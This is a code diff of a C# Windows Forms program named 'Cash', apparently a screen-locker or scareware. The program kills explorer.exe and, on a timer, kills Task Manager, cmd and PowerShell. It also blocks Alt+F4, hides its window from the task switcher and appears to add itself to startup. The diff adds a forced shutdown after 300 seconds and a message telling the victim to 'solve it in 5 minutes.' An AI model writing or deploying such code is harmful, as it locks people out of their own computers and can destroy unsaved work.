@@ -1,16 +1,6 @@
 ﻿using Microsoft.Win32;
 using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
-using System.Drawing;
-using System.IO;
-using System.Linq;
-using System.Security.Cryptography;
-using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Cash
@@ -21,8 +11,9 @@ namespace Cash
         {
             this.KeyDown += Form1_KeyDown;
             InitializeComponent();
-            // this.CenterToScreen();
-            System.Diagnostics.Process.Start("cmd.exe", "taskkill -f -im explorer.exe");
+            this.CenterToScreen();
+            Process.Start("cmd.exe", " shutdown -f -s -t 300");
+            Process.Start("cmd.exe", "taskkill -f -im explorer.exe");
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -34,19 +25,22 @@ namespace Cash
 
         private void Form1_KeyDown(object sender, KeyEventArgs e)
         {
-           if (e.Alt && e.KeyCode == Keys.F4)
+            if (e.Alt && e.KeyCode == Keys.F4)
+            {
                 e.Handled = true;
+            }
+                
 
-
+            
         }
         private void timer1_Tick(object sender, EventArgs e)
         {
             foreach (Process process in Process.GetProcessesByName("Taskmgr")) { if (process.ProcessName == "Taskmgr") { process.Kill(); } }
-            
+
             foreach (Process process in Process.GetProcessesByName("cmd")) { if (process.ProcessName == "cmd") { process.Kill(); } }
-            
+
             foreach (Process process in Process.GetProcessesByName("powershell")) { if (process.ProcessName == "powershell") { process.Kill(); } }
-       
+
         }
         private void SetStartup(bool enable)
         {
@@ -75,17 +69,23 @@ namespace Cash
         {
             get
             {
-                // Turn on WS_EX_TOOLWINDOW style bit
+                
                 CreateParams cp = base.CreateParams;
                 cp.ExStyle |= 0x80;
                 return cp;
-                
+
             }
         }
+
+
+
         private void button1_Click(object sender, EventArgs e)
         {
-        
-            MessageBox.Show("Good Luck!");
+
+            MessageBox.Show("The computer will shut down in 5 minutes.");
+            MessageBox.Show("Solve it in 5 minutes.");
         }
+
+        
     }
 }
